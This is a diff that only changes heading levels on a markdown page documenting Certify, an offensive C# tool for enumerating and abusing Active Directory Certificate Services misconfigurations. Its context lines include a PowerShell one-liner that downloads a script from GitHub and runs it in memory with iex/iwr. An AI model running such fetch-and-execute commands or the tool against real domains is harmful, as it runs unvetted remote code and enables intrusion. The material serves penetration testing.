@@ -15,7 +15,7 @@ Certify is a C# tool to enumerate and abuse misconfigurations in Active Director
 
 [@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_) are the primary authors of Certify and the the associated AD CS research ([blog](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)).
 
-### Installation
+## Installation
 
 Please compile the `.exe` yourself or use the PowerShell script below. The examples will use the PowerShell implementation.
 
@@ -23,7 +23,7 @@ Please compile the `.exe` yourself or use the PowerShell script below. The examp
 iex((iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1).content)
 ```
 
-### Examples
+## Examples
 
 #### Identify vulnerable PKIs
 
@@ -104,7 +104,7 @@ PS Z:\> Invoke-Certify -Command 'find /vulnerable'
 C3rt1fy completed in 00:00:01.1902168
 ```
 
-### URL list
+## URL List
 
 * [Github.com - Certify](https://github.com/GhostPack/Certify)
 * [Github.com - Certipy](https://github.com/ly4k/Certipy)
